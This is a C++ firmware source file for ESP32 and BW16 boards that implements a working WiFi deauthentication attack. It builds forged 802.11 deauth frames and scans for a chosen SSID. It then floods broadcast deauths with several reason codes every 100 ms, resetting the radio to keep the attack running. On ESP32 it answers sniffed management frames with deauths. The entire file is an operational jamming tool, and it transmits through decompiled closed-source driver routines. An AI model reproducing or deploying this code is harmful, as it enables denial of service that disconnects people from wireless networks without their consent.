#include "wifi_deauth.hpp"
#include "WiFi.h"
#include "wifi_utils.hpp"
#include <string.h>
static bool isRunning = false;
#if defined(BOARD_WIFI_DEV) || defined(BOARD_ESP32_C6) || defined(BOARD_ESP32_CAM) || defined(BOARD_ESP32_S3) || defined(BOARD_ESP32_WROOM) || defined(BOARD_ESP32_WROVER) || defined(BOARD_ESP32_C3) || defined(BOARD_ESP32_C5)
#define BOARD_ESP32
#include <esp_wifi.h>
static void deauthESP(const uint8_t *bssid, const uint8_t *sta)
{
    struct __attribute__((packed))
    {
        uint8_t frame_control[2];
        uint8_t duration[2];
        uint8_t addr1[6]; // destination (STA)
        uint8_t addr2[6]; // source   (AP/BSSID)
        uint8_t addr3[6]; // BSSID
        uint8_t sequence_control[2];
        uint8_t reason_code[2];
    } deauthFrame;

    deauthFrame.frame_control[0] = 0xC0;
    deauthFrame.frame_control[1] = 0x00;
    deauthFrame.duration[0] = 0xFF;
    deauthFrame.duration[1] = 0xFF;
    memcpy(deauthFrame.addr1, sta, 6);
    memcpy(deauthFrame.addr2, bssid, 6);
    memcpy(deauthFrame.addr3, bssid, 6);
    deauthFrame.sequence_control[0] = 0x00;
    deauthFrame.sequence_control[1] = 0x00;
    deauthFrame.reason_code[0] = 0x06;
    deauthFrame.reason_code[1] = 0x00;
    esp_wifi_80211_tx(WIFI_IF_STA,
                      reinterpret_cast<uint8_t *>(&deauthFrame),
                      sizeof(deauthFrame),
                      true);
}

#elif defined(BOARD_BW16)
#include "wifi_conf.h"
#include "map"
#include "wifi_util.h"
#include "wifi_structures.h"
// from https://github.com/warwick320/NovaX-5G-RTL8720dn-Bw16-Deauther/blob/main/BW16/wifi_cust_tx.cpp
typedef struct
{
    uint16_t frame_control = 0xC0;
    uint16_t duration = 0xFFFF;
    uint8_t destination[6];
    uint8_t source[6];
    uint8_t access_point[6];
    const uint16_t sequence_number = 0;
    uint16_t reason = 0x06;
} DeauthFrame;

// Define a global variable to track the deauth target
static int globalTargetID = -1;
static int globalChannel = 0;
static unsigned long lastDeauthTime = 0;
static const unsigned long DEAUTH_INTERVAL = 100; // milliseconds between deauth attempts
static unsigned long lastChannelSetTime = 0;
static const unsigned long CHANNEL_RESET_INTERVAL = 5000; // Reset channel every 5 seconds
static int packetCounter = 0;
static const int RESET_AFTER_PACKETS = 10; // Reset WiFi after this many packets

/*
 * Import the needed c functions from the closed-source libraries
 * The function definitions might not be 100% accurate with the arguments as the types get lost during compilation and cannot be retrieved back during decompilation
 * However, these argument types seem to work perfect
 */
extern uint8_t *rltk_wlan_info;
extern "C" void *alloc_mgtxmitframe(void *ptr);
extern "C" void update_mgntframe_attrib(void *ptr, void *frame_control);
extern "C" int dump_mgntframe(void *ptr, void *frame_control);

/*
 * Transmits a raw 802.11 frame with a given length.
 * The frame must be valid and have a sequence number of 0 as it will be set automatically.
 * The frame check sequence is added automatically and must not be included in the length.
 * @param frame A pointer to the raw frame
 * @param size The size of the frame
 */
static void wifi_tx_raw_frame(void *frame, size_t length)
{
    uint8_t *ptr = (uint8_t *)**(uint32_t **)(rltk_wlan_info + 0x10);
    uint8_t *frame_control = (uint8_t *)alloc_mgtxmitframe(ptr + 0xae0);

    if (frame_control != 0)
    {
        update_mgntframe_attrib(ptr, frame_control + 8);
        memset((void *)*(uint32_t *)(frame_control + 0x80), 0, 0x68);
        uint8_t *frame_data = (uint8_t *)*(uint32_t *)(frame_control + 0x80) + 0x28;
        memcpy(frame_data, frame, length);
        *(uint32_t *)(frame_control + 0x14) = length;
        *(uint32_t *)(frame_control + 0x18) = length;
        dump_mgntframe(ptr, frame_control);
    }
}

/*
 * Transmits a 802.11 deauth frame on the active channel
 * @param src_mac An array of bytes containing the mac address of the sender. The array has to be 6 bytes in size
 * @param dst_mac An array of bytes containing the destination mac address or FF:FF:FF:FF:FF:FF to broadcast the deauth
 * @param reason A reason code according to the 802.11 spec. Optional
 */
static void wifi_tx_deauth_frame(void *src_mac, void *dst_mac, uint16_t reason)
{
    DeauthFrame frame;
    memcpy(&frame.source, src_mac, 6);
    memcpy(&frame.access_point, src_mac, 6);
    memcpy(&frame.destination, dst_mac, 6);
    frame.reason = reason;
    wifi_tx_raw_frame(&frame, sizeof(DeauthFrame));
}

// Send a single deauth packet
static void sendDeauthPacket(int targetID)
{
    if (targetID >= 0 && targetID < bw16ScanCount)
    {
        uint8_t target_bssid[6];
        memcpy(target_bssid, bw16ScanResults[targetID].bssid, 6);

        // First send a broadcast deauth frame
        wifi_tx_deauth_frame(target_bssid, (void *)"\xFF\xFF\xFF\xFF\xFF\xFF", 2);

        // Then try with a few different reason codes to increase effectiveness
        for (uint16_t reason = 1; reason <= 4; reason++)
        {
            wifi_tx_deauth_frame(target_bssid, (void *)"\xFF\xFF\xFF\xFF\xFF\xFF", reason);
        }
    }
}
#endif

void WiFiDeauth::update()
{
#if defined(BOARD_BW16)
    unsigned long currentTime = millis();

    // Check if WiFi needs to be reset due to timeout
    if (isRunning && packetCounter >= RESET_AFTER_PACKETS)
    {

        // Reset the WiFi connection but maintain our attack state
        WiFi.disconnect();
        wifi_manager_init();
        wifi_on(WIFI_STA);

        // Reset channel
        wext_set_channel(WLAN0_NAME, globalChannel);

        // Reset the counter
        packetCounter = 0;
        lastChannelSetTime = currentTime;

        // Give the system time to stabilize
        delay(100);
    }

    // Periodically reset the channel to ensure it stays set
    if (isRunning && currentTime - lastChannelSetTime >= CHANNEL_RESET_INTERVAL)
    {
        uint8_t current_channel = 0;
        wext_get_channel(WLAN0_NAME, &current_channel);

        // Reset the channel regardless
        wext_set_channel(WLAN0_NAME, globalChannel);

        lastChannelSetTime = currentTime;
    }

    // Send deauth packets at the specified interval
    if (isRunning && globalTargetID >= 0 && currentTime - lastDeauthTime >= DEAUTH_INTERVAL)
    {
        lastDeauthTime = currentTime;

        // Make sure we're on the right channel before sending
        uint8_t current_channel = 0;
        wext_get_channel(WLAN0_NAME, &current_channel);
        if (current_channel != globalChannel)
        {
            wext_set_channel(WLAN0_NAME, globalChannel);
            lastChannelSetTime = currentTime;
        }

        // Send the deauth packet
        sendDeauthPacket(globalTargetID);

        // Increment the packet counter
        packetCounter++;
    }

    delay(20);
#endif
}

bool WiFiDeauth::start(const char *ssid)
{
#if defined(BOARD_BW16)
    // Reset all state
    isRunning = false;
    globalTargetID = -1;
    globalChannel = 0;
    packetCounter = 0;
    lastDeauthTime = 0;
    lastChannelSetTime = 0;

    // Make sure WiFi is in a clean state
    WiFi.disconnect();
    delay(100);
    wifi_manager_init();
    wifi_on(WIFI_STA);
    delay(100);
#endif
    // Scan for networks first
    WiFiUtils wifiUtils;
    if (wifiUtils.scan() == "")
    {
        return false;
    }
    int wifiChannel = 0;
#if defined(BOARD_ESP32)
    for (int i = 0; i < wifiScanCount; i++)
    {
        if (strcmp(wifiScanResults[i].ssid.c_str(), ssid) == 0)
        {
            wifiChannel = wifiScanResults[i].channel;
            isRunning = true;
            break;
        }
    }
    WiFi.mode(WIFI_MODE_APSTA);
    WiFi.softAP(ssid, "deauth", wifiChannel);
#elif defined(BOARD_BW16)
    WiFi.disconnect();
    delay(100);
    wifi_manager_init();
    wifi_on(WIFI_STA);
    delay(100);

    int targetID = -1;
    for (int i = 0; i < bw16ScanCount; i++)
    {
        if (strcmp(bw16ScanResults[i].ssid.c_str(), ssid) == 0)
        {
            wifiChannel = bw16ScanResults[i].channel;
            targetID = i;
            globalTargetID = targetID;
            globalChannel = wifiChannel;
            break;
        }
    }

    if (targetID >= 0)
    {
        // Set channel with explicit check
        wext_set_channel(WLAN0_NAME, wifiChannel);

        // Verify channel was set correctly
        uint8_t current_channel = 0;
        wext_get_channel(WLAN0_NAME, &current_channel);

        isRunning = true;
        lastDeauthTime = 0;
        lastChannelSetTime = millis();
        packetCounter = 0;
    }
    else
    {
        Serial1.print(F("[ERROR] Target SSID not found: "));
        Serial1.println(ssid);
        return false;
    }
#endif

#ifdef BOARD_ESP32
    esp_wifi_set_promiscuous(true);
    esp_wifi_set_channel(wifiChannel, WIFI_SECOND_CHAN_NONE);
    esp_wifi_set_protocol(WIFI_IF_STA, WIFI_PROTOCOL_11B | WIFI_PROTOCOL_11G | WIFI_PROTOCOL_11N);
    esp_wifi_set_promiscuous_rx_cb([](void *buf, wifi_promiscuous_pkt_type_t type)
                                   {
                                        if (type == WIFI_PKT_MGMT)
                                        {
                                            wifi_promiscuous_pkt_t *pkt = (wifi_promiscuous_pkt_t *)buf;
                                            deauthESP(pkt->payload + 10, pkt->payload + 4);
                                        } });
#endif
    return true;
}

void WiFiDeauth::stop()
{
    isRunning = false;

#ifdef BOARD_ESP32
    esp_wifi_set_promiscuous(false);
#endif
#ifndef BOARD_BW16
    WiFi.disconnect(true);
#else
    globalTargetID = -1;
    WiFi.disconnect();
#endif
#ifdef BOARD_ESP32
    ESP.restart();
#elif defined(BOARD_BW16)
    ota_platform_reset();
#endif
}